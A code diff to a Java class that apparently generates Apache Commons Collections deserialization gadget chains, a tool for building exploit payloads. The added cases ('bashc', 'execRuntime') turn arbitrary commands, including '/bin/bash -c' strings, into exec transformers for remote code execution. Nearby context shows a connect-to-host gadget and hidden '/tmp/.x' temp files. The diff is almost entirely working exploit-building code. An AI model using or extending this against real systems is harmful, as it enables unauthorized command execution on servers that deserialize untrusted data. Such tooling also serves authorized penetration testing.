@@ -642,6 +642,31 @@ public class Generator {
                 result = Commons1Gadgets.getConnectToTransformer(host, port);
                 break;}
 
+            case "bashc":{
+                final String[] execCmd = new String[] {"/bin/bash", "-c", stmt.getString("val")};
+                result = Commons1Gadgets.getExecTransformer(execCmd);
+                break;
+            }
+
+            case "execRuntime":{
+                final Object inp = stmt.get("val");
+                if (inp instanceof JSONArray){
+                    JSONArray jarr = (JSONArray) inp;
+                    String[] args = new String[jarr.length()];
+                    for(int i = 0, ln = jarr.length(); i < ln; i++){
+                        args[i] = (String)jarr.get(i);
+                    }
+                    result = Commons1Gadgets.getExecTransformer(args);
+
+                } else if (inp instanceof String) {
+                    result = Commons1Gadgets.getExecTransformer((String)inp);
+                } else {
+                    throw new RuntimeException("Unrecognized input type");
+                }
+
+                break;
+            }
+
             case "execWait":{
                 final SecureRandom rnd = new SecureRandom();
                 String fnamePrefix = Utils.getAsString(stmt, "tmpPrefix", "/tmp/.x");
